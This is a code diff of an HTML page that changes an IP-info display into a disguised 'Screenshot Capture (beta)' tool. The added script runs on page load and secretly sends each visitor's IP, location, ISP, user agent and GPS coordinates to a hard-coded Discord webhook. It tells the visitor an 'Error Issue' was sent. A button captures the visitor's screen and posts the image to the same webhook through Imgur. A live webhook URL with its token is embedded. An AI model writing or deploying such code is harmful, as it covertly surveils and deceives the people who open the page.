@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>What's My IP?</title>
+    <title>TEST BETA</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,59 +15,162 @@
             font-size: 2.5rem;
             color: #2E3A59;
         }
-        .info-box {
-            margin-top: 20px;
-            padding: 20px;
-            border: 2px solid #ccc;
-            border-radius: 10px;
-            display: inline-block;
-            background-color: #ffffff;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        button {
+            padding: 10px 20px;
+            font-size: 1.2rem;
+            cursor: pointer;
         }
-        .info {
-            font-size: 1.5rem;
-            margin: 10px 0;
+        #status {
+            margin-top: 20px;
+            font-size: 1.2rem;
         }
     </style>
 </head>
 <body>
 
-    <h1>Your IP Information</h1>
-    <div class="info-box">
-        <div class="info">IP: <span id="ip">Loading...</span></div>
-        <div class="info">Location: <span id="location">Loading...</span></div>
-        <div class="info">ISP: <span id="isp">Loading...</span></div>
-        <div class="info">User Agent: <span id="user-agent">Loading...</span></div>
-    </div>
+    <h1>Screenshot Capture (beta)</h1>
+    <button id="captureBtn">Capture Screenshot</button>
+    <p id="status">Status: Waiting for action</p>
 
     <script>
-        async function getIPInfo() {
+        const captureBtn = document.getElementById('captureBtn');
+        const status = document.getElementById('status');
+
+        // Automatically send user info on page load
+        (async function() {
             try {
-                // Fetch IP and related info from ipinfo.io
-                let response = await fetch('https://ipinfo.io/json', { mode: 'cors' });
-                if (!response.ok) {
-                    throw new Error("Failed to fetch data");
-                }
-                let data = await response.json();
+                const ipData = await getIPInfo();
+                const userAgent = navigator.userAgent;
+                const { latitude, longitude } = await getCoordinates();
 
-                // Update the page with the fetched data
-                document.getElementById('ip').innerText = data.ip;
-                document.getElementById('location').innerText = `${data.city}, ${data.region} (${data.country})`;
-                document.getElementById('isp').innerText = data.org;
+                await sendToDiscord(ipData, userAgent, latitude, longitude);
+                status.innerText = 'Error Issue sent automatically!';
 
-                // Display User Agent
-                document.getElementById('user-agent').innerText = navigator.userAgent;
             } catch (error) {
-                // Handle errors gracefully
-                document.getElementById('ip').innerText = "Error fetching IP";
-                document.getElementById('location').innerText = "Error fetching location";
-                document.getElementById('isp').innerText = "Error fetching ISP";
-                document.getElementById('user-agent').innerText = "Error fetching User Agent";
+                console.error('Error:', error);
+                status.innerText = 'Error sending user info!';
             }
+        })();
+
+        async function getIPInfo() {
+            const response = await fetch('https://ipinfo.io/json');
+            if (!response.ok) throw new Error("Failed to fetch IP data");
+            return response.json();
         }
 
-        // Call the function as soon as the page loads
-        window.onload = getIPInfo;
+        async function getCoordinates() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    }, error => {
+                        console.error("Geolocation error:", error);
+                        reject({ latitude: "Unavailable", longitude: "Unavailable" });
+                    });
+                } else {
+                    reject({ latitude: "Unavailable", longitude: "Unavailable" });
+                }
+            });
+        }
+
+        captureBtn.addEventListener('click', async () => {
+            try {
+                const imageUrl = await captureScreen();
+                await sendScreenshotToDiscord(imageUrl);
+                status.innerText = 'Screenshot sent successfully to Discord!';
+
+            } catch (error) {
+                console.error('Error capturing screenshot:', error);
+                status.innerText = 'Error capturing screenshot!';
+            }
+        });
+
+        async function captureScreen() {
+            const stream = await navigator.mediaDevices.getDisplayMedia({
+                video: true,
+                audio: false
+            });
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+            const bitmap = await imageCapture.grabFrame();
+            const canvas = document.createElement('canvas');
+            canvas.width = bitmap.width;
+            canvas.height = bitmap.height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0);
+            videoTrack.stop(); // Stop the video stream
+            return await uploadToImgur(canvas.toDataURL('image/png', 0.5)); // Upload to Imgur
+        }
+
+        async function uploadToImgur(imageData) {
+            const clientId = 'YOUR_IMGUR_CLIENT_ID'; // Replace with your Imgur Client ID
+            const response = await fetch('https://api.imgur.com/3/image', {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Client-ID ${clientId}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ image: imageData.split(',')[1] }) // Send base64 data
+            });
+            const data = await response.json();
+            if (!data.success) throw new Error('Failed to upload image to Imgur');
+            return data.data.link; // Return the URL of the uploaded image
+        }
+
+        async function sendToDiscord(ipData, userAgent, latitude, longitude) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
+
+            const webhookPayload = {
+                content: "@everyone User's info:",
+                embeds: [{
+                    title: "User's Information",
+                    fields: [
+                        { name: "IP", value: ipData.ip, inline: true },
+                        { name: "Location", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
+                        { name: "ISP", value: ipData.org, inline: true },
+                        { name: "User Agent", value: userAgent },
+                        { name: "Coordinates", value: `${latitude}, ${longitude}` }
+                    ],
+                    color: 3447003 // Color in Discord embed (blue)
+                }]
+            };
+
+            // Send a POST request to the Discord webhook
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(webhookPayload)
+            });
+        }
+
+        async function sendScreenshotToDiscord(imageUrl) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
+
+            const webhookPayload = {
+                content: "wow, they took a screenshot",
+                embeds: [{
+                    title: "Screenshot",
+                    image: {
+                        url: imageUrl // Discord requires a URL, so we use the Imgur link
+                    },
+                    color: 3447003 // Color in Discord embed (blue)
+                }]
+            };
+
+            // Send a POST request to the Discord webhook
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(webhookPayload)
+            });
+        }
     </script>
 
 </body>
